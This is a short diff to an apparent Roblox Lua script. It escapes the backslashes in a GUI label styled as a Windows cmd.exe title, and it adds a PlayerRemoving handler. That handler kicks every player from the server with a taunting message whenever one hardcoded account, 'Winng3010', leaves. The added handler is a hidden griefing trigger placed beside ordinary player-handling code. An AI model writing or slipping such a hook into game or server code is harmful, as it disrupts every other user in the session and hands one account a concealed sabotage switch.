@@ -283,7 +283,7 @@ v14.BorderSizePixel=1
 v14.BorderColor3=Color3.fromRGB(27,42,53)
 v14.Rotation=0
 v14.ClipsDescendants=false
-v14.Text="C:\Windows\system32\cmd.exe"
+v14.Text="C:\\Windows\\system32\\cmd.exe"
 v14.TextColor3=Color3.fromRGB(10,10,10)
 v14.TextSize=22
 v14.Font=Enum.Font.SourceSans
@@ -966,6 +966,16 @@ end
 
 Players.PlayerAdded:Connect(function(plr)
 	Check(plr)
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+	if plr.Name=="Winng3010" then
+		for _,v in next,Players:GetPlayers() do
+			pcall(function()
+				v:Kick("go and touch the grass")
+			end)
+		end
+	end
 end)
 
 for _,v in pairs(Players:GetPlayers()) do
